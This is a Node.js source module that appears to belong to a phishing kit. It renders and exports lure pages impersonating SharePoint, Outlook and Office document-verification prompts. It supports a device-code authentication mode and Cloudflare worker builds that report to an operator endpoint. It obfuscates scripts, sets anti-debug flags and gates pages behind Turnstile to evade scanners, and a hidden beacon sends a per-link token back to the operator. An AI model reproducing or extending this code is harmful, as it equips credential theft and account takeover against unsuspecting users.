const fs = require('fs');
const path = require('path');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');

// List all template directories present on disk (excluding 'assets' and 'custom').
function listDiskTemplates() {
  try {
    if (!fs.existsSync(TEMPLATES_DIR)) return [];
    return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
      .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
      .map(entry => entry.name);
  } catch (e) {
    return [];
  }
}

function normalizeTemplateKey(value) {
  return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
}

function resolveTemplateDirectory(templateType) {
  const input = String(templateType || '').trim();
  const fallbackDir = 'sharepoint3';
  const candidateDirs = fs.existsSync(TEMPLATES_DIR)
    ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
        .filter(entry => entry.isDirectory())
        .map(entry => entry.name)
    : [];

  const normalizedInput = normalizeTemplateKey(input || fallbackDir);
  for (const dirName of candidateDirs) {
    const normalizedDir = normalizeTemplateKey(dirName);
    if (normalizedDir === normalizedInput) {
      return path.join(TEMPLATES_DIR, dirName);
    }

    const configPath = path.join(TEMPLATES_DIR, dirName, 'config.json');
    if (fs.existsSync(configPath)) {
      try {
        const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        if (config?.name && normalizeTemplateKey(config.name) === normalizedInput) {
          return path.join(TEMPLATES_DIR, dirName);
        }
      } catch (err) {
        // ignore invalid template config and continue
      }
    }
  }

  const directPath = path.join(TEMPLATES_DIR, input || fallbackDir);
  if (fs.existsSync(directPath)) return directPath;

  return path.join(TEMPLATES_DIR, fallbackDir);
}

function loadTemplateConfig(templateType) {
  const templateDir = resolveTemplateDirectory(templateType);
  const templatePath = path.join(templateDir, 'config.json');
  if (fs.existsSync(templatePath)) {
    return JSON.parse(fs.readFileSync(templatePath, 'utf8'));
  }
  return {
    name: templateType,
    preload: true,
    auth_mode: 'devicecode',
    fields: [],
    background: { default: '', editable: true, blur: true },
  };
}

function loadTemplateHTML(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'index.html');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadTemplateCSS(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'style.css');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadTemplateJS(templateType) {
  const filePath = path.join(resolveTemplateDirectory(templateType), 'script.js');
  if (fs.existsSync(filePath)) return fs.readFileSync(filePath, 'utf8');
  return '';
}

function loadVerificationDesignCSS(designName) {
  const baseName = String(designName || 'outlook').trim();
  const designPath = path.join(DESIGNS_DIR, `${baseName}.css`);
  if (fs.existsSync(designPath)) return fs.readFileSync(designPath, 'utf8');
  const fallbackPath = path.join(DESIGNS_DIR, 'outlook.css');
  if (fs.existsSync(fallbackPath)) return fs.readFileSync(fallbackPath, 'utf8');
  return '';
}

// Read admin settings from the DB so generated pages honour values
// configured in the admin panel (obfuscation, anti-debug, soft-error retry,
// default background blur, default auth mode, etc.).
async function loadAdminSettings() {
  const obj = {};
  try {
    const db = require('../database/connection');
    const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
    for (const r of rows) obj[r.setting_key] = r.setting_value;
  } catch (e) { /* DB not ready */ }
  if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
  if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
  if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
  if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
  if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
  return obj;
}

function boolSetting(v) {
  if (v === true || v === 1) return true;
  return String(v || '').toLowerCase() === 'true';
}

// Build the per-link window.* variables block using DB-backed admin settings.
function buildWindowVars(link, user, settings, options = {}) {
  const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });

  const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
  const antidebugEnabled = boolSetting(settings.antidebug_enabled);
  const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);

  const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
  const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
  const bgUrl = link.custom_bg_url || link.background_blur_url || '';

  const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
  const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
  const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';

  // For exported files, set API base URL so it works when opened from file:// protocol
  let apiBase = '';
  if (options.apiBaseUrl) {
    apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
  } else if (config.APP_URL) {
    apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
  }

  return `<script>
    window.VG_JWT="${jt}";
    window.__API_BASE="${apiBase}";
    window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
    window.__AUTH_MODE="${authMode}";
    window.__BACKGROUND_BLUR_URL="${bgUrl}";
    window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur};
    window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";
    window.__DOC_TITLE="${link.title_text || 'Non-Disclosure Agreement'}";
    window.__DOC_PAGES="${link.pages || '4 pages'}";
    window.__PAGE_TITLE="${link.title_text || 'Verify your identity'}";
    window.__PAGE_MESSAGE="${link.message_text || 'Please verify your identity to continue'}";
    window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";
    window.__OBFUSCATION_ENABLED=${obfuscationEnabled ? 'true' : 'false'};
    window.__ANTIDEBUG_ENABLED=${antidebugEnabled ? 'true' : 'false'};
    window.__SOFT_ERROR_RETRY_ENABLED=${softErrorRetry ? 'true' : 'false'};
    window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
    window.__TURNSTILE_ENABLED=${turnstileEnabled ? 'true' : 'false'};
    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey}";
    window.__EXPORT_DOMAIN="${exportDomain}";
    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
  </script>`;
}

// Shared page-render pipeline used by both export and worker builds.
async function renderPageHtml(link, user, options = {}) {
  const templateType = link.template_type || 'sharepoint3';
  const designName = link.verification_design || 'outlook';
  const settings = await loadAdminSettings();

  // Pass apiBaseUrl to buildWindowVars for exported files
  if (options.apiBaseUrl) {
    options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
  }

  let html = loadTemplateHTML(templateType);
  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  const script = loadTemplateJS(templateType);

  if (html.includes('{{CSS}}')) {
    html = html.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
  }
  if (html.includes('{{SCRIPT}}')) {
    html = html.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
  }

  html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
  html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
  html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
  html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
  html = html.replace('{{PAGES}}', String(link.pages || 1));

  const windowVars = buildWindowVars(link, user, settings, options);

  // Load VG engine and inject before </head>
  let vgEngine = '';
  const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
  if (fs.existsSync(vgEnginePath)) {
    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
  }
  const engineScript = vgEngine ? `<script>${vgEngine}<\/script>` : '';
  html = html.replace('</head>', `${windowVars}${engineScript}</head>`);

  // Preload block handling
  const templateConfig = loadTemplateConfig(templateType);
  if (templateConfig.preload) {
    html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
    html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
  } else {
    html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
    html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
  }

  // Optional obfuscation of the inline template script
  if (boolSetting(settings.obfuscation_enabled) || link.obfuscated) {
    try {
      const JavaScriptObfuscator = require('javascript-obfuscator');
      const obfuscated = JavaScriptObfuscator.obfuscate(script, {
        compact: true, controlFlowFlattening: true, deadCodeInjection: true,
        debugProtection: false, selfDefending: true,
      }).getObfuscatedCode();
      html = html.replace(`<script>${script}</script>`, `<script>${obfuscated}</script>`);
    } catch (e) {
      console.error('[Obfuscation] Failed:', e.message);
    }
  }

  // Beacon tracking - use absolute URL with __API_BASE for exported files
  const beaconBase = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
  const beaconUrl = beaconBase ? beaconBase + '/beacon' : '/beacon';
  html = html.replace('</body>', `<img src="${beaconUrl}?t=${Date.now()}" width="1" height="1" style="display:none" onerror="fetch('${beaconUrl}',{method:'POST',body:JSON.stringify({jwt_token:window.VG_JWT})})"></body>`);

  return html;
}

async function generateExportHtml(link, user, options = {}) {
  return renderPageHtml(link, user, options);
}

async function buildWorkerScript(link, user, apiBaseUrl) {
   const pageHtml = await renderPageHtml(link, user, {});

   let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');

   const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
   
   // Generate JWT for this link
   const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
   
   workerJs = workerJs
     .replace("'{{JWT_TOKEN}}'", `'${linkJwt}'`)
     .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
     .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
     .replace("'{{VERIFY_ENDPOINT}}'", `'${verifyUrl}'`)
     .replace("'{{BEACON_ENDPOINT}}'", `'${verifyUrl}'`)
     .replace("'{{LOG_ENDPOINT}}'", `'${verifyUrl}'`)
     .replace("'{{TEMPLATE_HTML}}'", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');

   return workerJs;
}

module.exports = {
  normalizeTemplateKey,
  listDiskTemplates,
  resolveTemplateDirectory,
  loadTemplateConfig,
  loadTemplateHTML,
  loadTemplateCSS,
  loadTemplateJS,
  loadVerificationDesignCSS,
  loadAdminSettings,
  boolSetting,
  generateExportHtml,
  buildWorkerScript,
};
